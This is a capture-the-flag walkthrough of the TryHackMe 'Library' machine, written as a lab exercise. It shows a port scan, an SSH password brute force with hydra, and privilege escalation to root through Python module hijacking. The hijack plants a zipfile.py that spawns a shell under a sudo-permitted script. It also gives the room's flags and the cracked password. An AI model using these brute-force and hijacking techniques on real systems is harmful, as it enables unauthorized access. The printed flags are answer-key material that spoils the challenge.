# <div align="center">[Library](https://tryhackme.com/room/bsidesgtlibrary)</div>
<div align="center">boot2root machine for FIT and bsides guatemala CTF</div>
<br>
<div align="center">
  <img  height="200" alt="image" src="https://github.com/user-attachments/assets/159e9cc2-4a05-4692-8e33-5b9def3b76f7" />
</div>

# Task 1. Challenge

Read user.txt and root.txt

> Q1. user.txt

After launching the machine, I obtained the target IP: `10.48.129.75`
I performed a full port scan:

``` 
nmap -sS -sC -sV -p- 10.48.129.75 
```

It gave me the following result :

```
Nmap scan report for 10.48.129.75
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to  Blog - Library Machine
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 169.47 seconds
```

Based on the above information, I visited the website which showed me a blog post:  ` Posted on June 29th 2009 by meliodas - 3 comments`
As per the nmap scan above i also checked ` http://10.48.129.75/robots.txt `
which told me :
```
User-agent: rockyou 
Disallow: /
```
So it was asking me to use rockyou.txt on the username meliodas for the ssh login.
I used hydra :
```
hydra -l meliodas  -P /usr/share/wordlists/rockyou.txt ssh://10.48.129.75 -t 4
```
It gave me the following result:
```
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-04-06 10:22:43
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking ssh://10.48.129.75:22/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 14344319 to do in 2988:24h, 4 active
[22][ssh] host: 10.48.129.75   login: meliodas   password: iloveyou1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-04-06 10:25:44
```
I tried ssh login: `ssh meliodas@10.48.129.75 -p 22 ` using the password: `iloveyou1`.
I was able to successfully login.
Inside ssh :
```
meliodas@ubuntu:~$ ls
bak.py  user.txt
meliodas@ubuntu:~$ cat user.txt
6d488cbb3f111d135722c33cb635f4ec
```

Answer: 
```
6d488cbb3f111d135722c33cb635f4ec
```

> Q2. root.txt

I checked the other python file :
```
meliodas@ubuntu:~$ cat bak.py
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

I also checked sudo permissions: 

```
meliodas@ubuntu:~$ sudo -l
Matching Defaults entries for meliodas on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User meliodas may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
```
The above told me that Script runs as root but cannot be modified
So I tried that:

```
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
meliodas@ubuntu:~$
```

Nothing happened.
But the script imports external modules:
- import os
- import zipfile

This opens the door for: `Python Module Hijacking`

Python loads modules in this order:
1. Current directory
2. System libraries
So I created a malicious module:
```
meliodas@ubuntu:~$ echo 'import os; os.system("/bin/sh")' > zipfile.py
```
and tried running the python file again:
```
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
# 
```
I obtained the root shell.
So I checked the id just to be sure and then read the contents of root.txt
```
meliodas@ubuntu:~$ sudo python /home/meliodas/bak.py
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
bak.py  user.txt  zipfile.py  zipfile.pyc
# cat /root/root.txt 
e8c8c6c256c35515d1d344ee0488c617
# Connection to 10.48.129.75 closed by remote host.
Connection to 10.48.129.75 closed.
```

Answer:
```
e8c8c6c256c35515d1d344ee0488c617
```


<br>

# 🧠 Summary
- Enumerated target → found SSH & HTTP services 
- Discovered username meliodas from website
- Used Hydra with rockyou.txt → got SSH credentials
- Logged in and retrieved user.txt
- Checked sudo -l → found Python script runnable as root
- Exploited via Python module hijacking (zipfile.py)
- Spawned root shell and retrieved root.txt

